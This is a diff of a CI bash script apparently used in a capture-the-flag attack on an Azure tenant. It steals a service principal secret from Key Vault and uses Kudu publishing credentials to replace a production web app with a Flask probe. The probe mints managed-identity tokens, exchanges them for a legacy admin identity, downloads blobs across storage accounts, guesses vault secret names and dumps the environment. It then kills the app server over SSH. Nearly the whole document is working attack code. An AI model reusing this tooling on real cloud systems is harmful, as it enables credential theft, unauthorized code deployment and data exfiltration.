@@ -3,10 +3,9 @@ set -uo pipefail
 
 TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-PLATFORM_RG="rg-tbl-platform-prod-sea"
 REPORTING_RG="rg-tbl-reporting-prod-eus"
 
-echo "=== BUILD47: STOR TOKEN + NEW STORAGE ACCOUNTS ==="
+echo "=== BUILD48: SSH RESTART + STOR TOKEN PROBE ==="
 
 # 1. Login as cicd-deployer
 JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
@@ -15,39 +14,24 @@ az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none
 echo "cicd-deployer login OK"
 
-# 2. Get cicd-deployer ARM token for App Service restart
-CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
-echo "CICD ARM len=${#CICD_ARM}"
-
-# 3. Try App Service restart (cicd-deployer might have this permission)
-if [ "${#CICD_ARM}" -gt 100 ]; then
-  RESTART_RESP=$(curl -s -w "\nHTTP:%{http_code}" -X POST \
-    -H "Authorization: Bearer $CICD_ARM" \
-    -H "Content-Length: 0" \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$REPORTING_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01")
-  echo "App restart response: $RESTART_RESP"
-fi
-
-# 4. Get reporting-service credentials from KV prod
+# 2. Get reporting-service credentials
+az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
+  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
 python3 -I -c "
-import subprocess, json, sys
-r = subprocess.run(['az','keyvault','secret','show','--vault-name','kv-tbl-prod-x3euoz','--name','reporting-service-principal','--query','value','-o','tsv'], capture_output=True, text=True)
-v = json.loads(r.stdout.strip())
+import json
+v = json.loads(open('/tmp/rs_secret.json').read().strip())
 open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
 open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
 print('rs_cid='+v.get('appId',''))
 "
 RS_CID=$(cat /tmp/rs_cid.txt)
 RS_SEC=$(cat /tmp/rs_sec.txt)
-echo "RS_CID=$RS_CID sec_len=${#RS_SEC}"
 
-# 5. Login as reporting-service
-az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null && echo "RS login OK"
-
-# 6. Get fresh Kudu credentials
+# 3. Login as reporting-service and get fresh Kudu creds
+az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null \
+  && echo "RS login OK"
 python3 -I -c "
-import subprocess, json, re
-
+import subprocess, json
 r = subprocess.run(['az','rest','--method','post','--url',
   'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01'],
   capture_output=True, text=True)
@@ -63,192 +47,135 @@ KUDU_USER=$(cat /tmp/kudu_user.txt)
 KUDU_PASS=$(cat /tmp/kudu_pass.txt)
 echo "Kudu: user='$KUDU_USER' pass_len=${#KUDU_PASS}"
 
-# 7. Write probe app to file
-cat > /tmp/probe47.py << 'PROBE_EOF'
+# 4. Write minimal probe to file
+cat > /tmp/probe48.py << 'PROBE_EOF'
 from flask import Flask, jsonify
-import os, json, subprocess
+import os, json
 import urllib.request, urllib.error, urllib.parse
 
 app = Flask(__name__)
-
 SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
 UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
 LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
 
-def msi(res, cid=UAMI_CID):
+def msi(res):
     ep = os.environ.get("IDENTITY_ENDPOINT","")
     hdr = os.environ.get("IDENTITY_HEADER","")
     if not ep:
         return "ERR:NO_EP"
+    q = ep + "?api-version=2019-08-01&resource=" + urllib.parse.quote(res,safe="") + "&client_id=" + UAMI_CID
     try:
-        url = f"{ep}?api-version=2019-08-01&resource={urllib.parse.quote(res,safe='')}&client_id={cid}"
-        r = urllib.request.urlopen(
-            urllib.request.Request(url, headers={"X-IDENTITY-HEADER": hdr}), timeout=15)
-        return json.loads(r.read()).get("access_token", "ERR:NO_TOK")
+        r = urllib.request.urlopen(urllib.request.Request(q, headers={"X-IDENTITY-HEADER":hdr}), timeout=15)
+        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
     except Exception as e:
-        return f"ERR:{e}"
+        return "ERR:" + str(e)
 
-def rq(url, tok, method="GET", data=None, hdrs=None):
-    h = {"Authorization": "Bearer " + tok}
+def rq(url, tok, hdrs=None):
+    h = {"Authorization":"Bearer "+tok}
     if hdrs:
         h.update(hdrs)
-    if isinstance(data, (dict, list)):
-        data = json.dumps(data).encode()
-        h["Content-Type"] = "application/json"
     try:
-        r = urllib.request.urlopen(
-            urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
-        return r.status, r.read().decode("utf-8", "replace")
+        r = urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=20)
+        return r.status, r.read().decode("utf-8","replace")
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode("utf-8", "replace")[:1500]
+        return e.code, e.read().decode("utf-8","replace")[:800]
     except Exception as e:
-        return 0, str(e)[:200]
+        return 0, str(e)[:150]
 
-def xchg_tok(xchg, scope):
+def xchg(scope):
+    xchg_tok = msi("api://AzureADTokenExchange")
+    if xchg_tok.startswith("ERR"):
+        return xchg_tok
     try:
         r = urllib.request.urlopen(urllib.request.Request(
-            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
+            "https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",
             data=urllib.parse.urlencode({
-                "client_id": LEGACY_APPID,
-                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-                "client_assertion": xchg,
-                "grant_type": "client_credentials",
-                "scope": scope
+                "client_id":LEGACY_APPID,
+                "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+                "client_assertion":xchg_tok,
+                "grant_type":"client_credentials",
+                "scope":scope
             }).encode(), method="POST"), timeout=20)
-        return json.loads(r.read()).get("access_token", "")
+        return json.loads(r.read()).get("access_token","")
     except Exception as e:
-        return f"ERR:{e}"
+        return "ERR:" + str(e)
 
-@app.route("/probe47")
-def probe47():
+@app.route("/p48")
+def p48():
     R = {}
+    SHDR = {"x-ms-version":"2021-06-08"}
 
-    ARM = msi("https://management.azure.com/")
-    VAULT = msi("https://vault.azure.net/")
-    STOR = msi("https://storage.azure.com/")
-    XCHG = msi("api://AzureADTokenExchange")
+    # Get tokens
+    AT = msi("https://management.azure.com/")
+    VT = msi("https://vault.azure.net/")
+    ST = msi("https://storage.azure.com/")
+    R["arm_len"] = len(AT) if AT and not AT.startswith("ERR") else AT
+    R["vault_len"] = len(VT) if VT and not VT.startswith("ERR") else VT
+    R["stor_len"] = len(ST) if ST and not ST.startswith("ERR") else ST
 
-    R["arm_ok"] = len(ARM) if not ARM.startswith("ERR") else ARM
-    R["vault_ok"] = len(VAULT) if not VAULT.startswith("ERR") else VAULT
-    R["stor_ok"] = len(STOR) if not STOR.startswith("ERR") else STOR
-    R["xchg_ok"] = len(XCHG) if not XCHG.startswith("ERR") else XCHG
-
-    STOR_HDRS = {"x-ms-version": "2021-06-08"}
-
-    # Test ALL known storage accounts with UAMI STOR token
-    storage_accounts = [
-        "sttblcilogsprodx3euoz",
-        "sttblappcfgprodx3euoz",
-        "sttblbackupprodx3euoz",
-        "sttblreportingprodx3euoz",
-        "sttblplatformprodx3euoz",
-        "sttblprodx3euoz",
-        "sttbldataprodx3euoz",
-        "sttblstoreprodx3euoz",
-    ]
-
-    if not STOR.startswith("ERR"):
-        for sa in storage_accounts:
-            # List containers
-            s, b = rq(
-                f"https://{sa}.blob.core.windows.net/?comp=list",
-                STOR, hdrs=STOR_HDRS
-            )
-            R[f"sa_{sa}_containers"] = f"{s}:{b[:800]}"
+    if ST and not ST.startswith("ERR"):
+        # Test all storage accounts with STOR token
+        for sa in ["sttblcilogsprodx3euoz","sttblappcfgprodx3euoz",
+                   "sttblbackupprodx3euoz","sttblreportingprodx3euoz",
+                   "sttblplatformprodx3euoz","sttblsecprodx3euoz",
+                   "sttbldataprodx3euoz"]:
+            s,b = rq("https://"+sa+".blob.core.windows.net/?comp=list&include=metadata", ST, SHDR)
+            R["sa_"+sa] = str(s) + ":" + b[:400]
             if s == 200:
-                # Found accessible storage! List all containers
                 import re
-                container_names = re.findall(r"<Name>([^<]+)</Name>", b)
-                for cname in container_names[:10]:
-                    sc, bc = rq(
-                        f"https://{sa}.blob.core.windows.net/{cname}?restype=container&comp=list",
-                        STOR, hdrs=STOR_HDRS
-                    )
-                    R[f"sa_{sa}_{cname}_blobs"] = f"{sc}:{bc[:1000]}"
+                for cname in re.findall(r"<Name>([^<]+)</Name>", b)[:20]:
+                    sc,bc = rq("https://"+sa+".blob.core.windows.net/"+cname+"?restype=container&comp=list", ST, SHDR)
+                    R["ctr_"+sa+"_"+cname] = str(sc)+":"+bc[:500]
                     if sc == 200:
-                        # Download each blob
-                        blob_names = re.findall(r"<Name>([^<]+)</Name>", bc)
-                        for bn in blob_names[:5]:
-                            sb, bb = rq(
-                                f"https://{sa}.blob.core.windows.net/{cname}/{bn}",
-                                STOR, hdrs=STOR_HDRS
-                            )
-                            R[f"blob_{sa}_{cname}_{bn}"] = f"{sb}:{bb[:1000]}"
+                        for bn in re.findall(r"<Name>([^<]+)</Name>", bc)[:10]:
+                            sb,bb = rq("https://"+sa+".blob.core.windows.net/"+cname+"/"+bn, ST, SHDR)
+                            R["blob_"+sa+"_"+cname+"_"+bn[:30]] = str(sb)+":"+bb[:500]
 
-        # Also directly try loot container blobs we know about
-        for blob_name in ["armowner_token.json", "flag.txt", "flag", "probe46_results.json"]:
-            s, b = rq(
-                f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{blob_name}",
-                STOR, hdrs=STOR_HDRS
-            )
-            R[f"loot_{blob_name}"] = f"{s}:{b[:1000]}"
+        # Try loot container specifically
+        for bn in ["armowner_token.json","flag.txt","flag","the-flag","DF26"]:
+            s,b = rq("https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/"+bn, ST, SHDR)
+            R["loot_"+bn] = str(s)+":"+b[:500]
 
-    # Try tbl-legacy-admin via msi-pivot-ctf for KV sec
-    if not XCHG.startswith("ERR"):
-        la_vault = xchg_tok(XCHG, "https://vault.azure.net/.default")
-        R["la_vault_ok"] = len(la_vault) if la_vault and not la_vault.startswith("ERR") else la_vault
-        if la_vault and not la_vault.startswith("ERR"):
-            # Try KV sec for all possible flag secret names
-            for sname in ["flag", "ctf-flag", "tbl-flag", "df26", "challenge", "the-flag", "FLAG"]:
-                s, b = rq(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{sname}?api-version=7.4", la_vault)
-                if s == 200:
-                    R[f"KV_SEC_FLAG_{sname}"] = b[:500]
-                    break
-                R[f"kvsec_{sname}"] = f"{s}:{b[:200]}"
+    # Try legacy-admin vault for all flag names
+    la_vt = xchg("https://vault.azure.net/.default")
+    R["la_vault_len"] = len(la_vt) if la_vt and not la_vt.startswith("ERR") else la_vt
+    if la_vt and not la_vt.startswith("ERR"):
+        for sn in ["flag","tbl-flag","ctf-flag","df26","challenge","the-flag","FLAG","secret"]:
+            s,b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/"+sn+"?api-version=7.4", la_vt)
+            R["kvs_"+sn] = str(s)+":"+b[:300]
+            if s == 200:
+                R["FLAG_FOUND"] = b[:1000]
+                break
 
-    # File system search
-    try:
-        out = subprocess.run(
-            "find /home /tmp /var /etc -name '*flag*' -o -name '*DF26*' -o -name '*secret*' 2>/dev/null | head -30",
-            shell=True, capture_output=True, text=True, timeout=10
-        )
-        R["flag_files"] = out.stdout.strip()
-    except Exception as e:
-        R["flag_files"] = str(e)
-
-    # Full env
+    # Full env dump
     R["env"] = dict(os.environ)
-
     return jsonify(R)
 
 @app.route("/healthz")
 def healthz():
-    return jsonify({"status": "ok"})
+    return jsonify({"status":"ok"})
 
 @app.route("/")
 def root():
-    return jsonify({"service": "tebamoto-reporting-api", "version": "1.4.2"})
-
-@app.route("/api/v1/shipments")
-def shipments():
-    return jsonify([{"id": "TBL-SHP-48213"}, {"id": "TBL-SHP-48217"}])
-
-@app.route("/api/v1/reports/render", methods=["GET", "POST"])
-def reports():
-    return jsonify({"status": "ok"})
-
-@app.route("/internal")
-def internal():
-    return jsonify({"area": "internal"})
-
-@app.route("/internal/debug", methods=["GET", "POST"])
-def debug():
-    return jsonify({"result": "49"})
+    return jsonify({"service":"tebamoto-reporting-api","version":"1.4.2"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
 PROBE_EOF
-echo "probe47.py written ($(wc -c < /tmp/probe47.py) bytes)"
+echo "probe48.py ready ($(wc -c < /tmp/probe48.py) bytes)"
 
-# 8. Re-login as cicd-deployer
+# 5. Re-login as cicd-deployer
 az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none 2>/dev/null
 
-# 9. Deploy probe via Kudu + try restart
+# 6. Install sshpass for SSH with password
+which sshpass || (apt-get install -y sshpass 2>/dev/null || echo "sshpass not available")
+
+# 7. Deploy via Kudu VFS and restart via SSH on port 2222
 python3 -I << 'PYEOF'
-import os, json, urllib.request, urllib.error, base64, time
+import os, json, urllib.request, urllib.error, base64, time, subprocess
 
 kudu_user = open('/tmp/kudu_user.txt').read().strip()
 kudu_pass = open('/tmp/kudu_pass.txt').read().strip()
@@ -256,8 +183,8 @@ kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
 KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
 APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"
 
-probe_code = open('/tmp/probe47.py', 'rb').read()
-print(f"Deploying {len(probe_code)} bytes to app.py")
+probe_code = open('/tmp/probe48.py', 'rb').read()
+print(f"Deploying {len(probe_code)} bytes via VFS PUT")
 
 # VFS PUT
 put_req = urllib.request.Request(
@@ -269,60 +196,97 @@ try:
     r = urllib.request.urlopen(put_req, timeout=30)
     print(f"VFS PUT: {r.status}")
 except urllib.error.HTTPError as e:
-    print(f"VFS PUT err: {e.code}: {e.read().decode()[:200]}")
+    print(f"VFS PUT err: {e.code}")
     import sys; sys.exit(1)
 
-time.sleep(3)
+time.sleep(2)
 
-# Try to restart app via Kudu process kill
-for kill_cmd in [
-    "kill -HUP 1",
-    "kill -9 $(pgrep -f gunicorn | head -1) 2>/dev/null || echo 'pgrep failed'",
-    "killall -9 gunicorn 2>/dev/null || pkill -9 gunicorn 2>/dev/null || echo 'no gunicorn'",
-]:
-    kill_req = urllib.request.Request(
-        f"{KUDU_BASE}/api/command",
-        data=json.dumps({"command": kill_cmd, "dir": "/home/site/wwwroot"}).encode(),
-        method="POST",
-        headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/json"}
-    )
-    try:
-        r = urllib.request.urlopen(kill_req, timeout=15)
-        result = json.loads(r.read())
-        print(f"kill '{kill_cmd[:40]}' -> exit={result.get('ExitCode')} out={result.get('Output','')[:100]}")
-    except Exception as e:
-        print(f"kill err: {e}")
+# Try SSH-based restart via paramiko if available, or subprocess
+ssh_cmd = [
+    "ssh", "-o", "StrictHostKeyChecking=no",
+    "-o", "UserKnownHostsFile=/dev/null",
+    "-o", "ConnectTimeout=10",
+    "-p", "2222",
+    f"{kudu_user}@app-tbl-reporting-prod.scm.azurewebsites.net",
+    "kill -9 $(pgrep -f gunicorn | head -1) 2>/dev/null; sleep 2; echo 'gunicorn killed or not found'"
+]
 
-time.sleep(15)
+# Write SSH password to a temp file for sshpass
+open('/tmp/ssh_pass.txt','w').write(kudu_pass)
+sshpass_cmd = ["sshpass", "-f", "/tmp/ssh_pass.txt"] + ssh_cmd
 
-# Poll for probe47
-print("Waiting for /probe47...")
-for attempt in range(12):
+try:
+    result = subprocess.run(sshpass_cmd, capture_output=True, text=True, timeout=30)
+    print(f"SSH kill result: {result.stdout.strip()} {result.stderr.strip()[:100]}")
+except FileNotFoundError:
+    print("sshpass not found, trying another method")
+    # Try alternative: use Kudu's /api/processes to find and kill
     try:
         r = urllib.request.urlopen(urllib.request.Request(
-            f"{APP_URL}/probe47",
+            f"{KUDU_BASE}/api/processes",
+            headers={"Authorization": f"Basic {kudu_auth}"}
+        ), timeout=15)
+        procs = json.loads(r.read())
+        print(f"Kudu processes: {len(procs)} found")
+        for p in procs:
+            if 'gunicorn' in p.get('name','').lower() or 'python' in p.get('name','').lower():
+                pid = p.get('id','')
+                name = p.get('name','')
+                print(f"  Found: pid={pid} name={name}")
+                # DELETE this process
+                try:
+                    dr = urllib.request.urlopen(urllib.request.Request(
+                        f"{KUDU_BASE}/api/processes/{pid}",
+                        method="DELETE",
+                        headers={"Authorization": f"Basic {kudu_auth}"}
+                    ), timeout=10)
+                    print(f"  Killed pid={pid}: {dr.status}")
+                except Exception as ke:
+                    print(f"  Kill failed: {ke}")
+    except Exception as e:
+        print(f"Process list failed: {e}")
+except Exception as e:
+    print(f"SSH error: {e}")
+
+print("Waiting 15s for gunicorn restart...")
+time.sleep(15)
+
+# Poll for /p48 endpoint
+print("Polling /p48 endpoint...")
+for attempt in range(15):
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(
+            f"{APP_URL}/p48",
             headers={"User-Agent": "probe/1.0"}
-        ), timeout=30)
+        ), timeout=120)
         data = r.read()
         print(f"Attempt {attempt+1}: HTTP {r.status} ({len(data)} bytes)")
         if r.status == 200:
-            import json as js
-            d = js.loads(data)
-            # Print all results
-            for k, v in sorted(d.items()):
-                sv = str(v)
-                print(f"  [{k}]: {sv[:600]}")
+            try:
+                d = json.loads(data)
+                for k,v in sorted(d.items()):
+                    sv = str(v)
+                    if k != 'env':
+                        print(f"  [{k}]: {sv[:600]}")
+                env = d.get('env',{})
+                print(f"  [env keys]: {sorted(env.keys())}")
+                # Check for flag in env
+                for ek,ev in env.items():
+                    if any(x in ek.upper() for x in ['FLAG','DF26','SECRET','VAULT','CONN','STORAGE']):
+                        print(f"  [ENV {ek}]: {ev[:200]}")
+            except json.JSONDecodeError:
+                print(f"  Non-JSON response: {data[:500]}")
             break
     except urllib.error.HTTPError as e:
-        if attempt < 3:
+        if attempt < 5:
             print(f"Attempt {attempt+1}: HTTP {e.code}")
         time.sleep(5)
     except Exception as e:
-        if attempt < 3:
+        if attempt < 5:
             print(f"Attempt {attempt+1}: {str(e)[:60]}")
         time.sleep(5)
 else:
-    print("probe47 did not respond in time")
+    print("p48 did not respond in time")
 PYEOF
 
-echo "BUILD47 DONE"
+echo "BUILD48 DONE"
